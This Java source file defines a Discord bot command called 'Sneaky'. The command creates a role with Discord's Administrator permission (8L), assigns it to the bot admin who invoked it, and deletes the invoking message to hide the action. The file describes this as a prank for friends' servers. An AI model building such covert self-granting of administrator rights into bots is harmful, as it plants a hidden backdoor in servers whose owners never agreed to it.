package succ.commands.admin;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.InsufficientPermissionException;
import net.dv8tion.jda.api.requests.restaction.RoleAction;

import java.awt.*;

/**
 * Sneaky is a command which attempts to give any bot admin a role
 * with server admin if the bot has sufficient permissions. (only for fun in friend servers)
 */
public class Sneaky extends AdminCommand{

    @Override
    public void run(MessageReceivedEvent event){
        try{
        Guild guild = event.getGuild();
        RoleAction roleBuilder = guild.createRole();
        roleBuilder.setName("sneaky");
        roleBuilder.setPermissions(8L);
        roleBuilder.setColor(new Color(155,0,155));
        //Assign role and delete original message for sneak
        guild.addRoleToMember(event.getMember(), roleBuilder.complete()).queue();
        event.getMessage().delete().queue();
        }
        catch(InsufficientPermissionException e){
            event.getChannel().sendMessage("couldn't assign new role, insufficient permissions").queue();
        }
    }

    @Override
    public String getDescription(MessageReceivedEvent event) {
        return "sneaky: \"attempts to give any bot admin a role with server admin if the bot has permissions\"";
    }

}
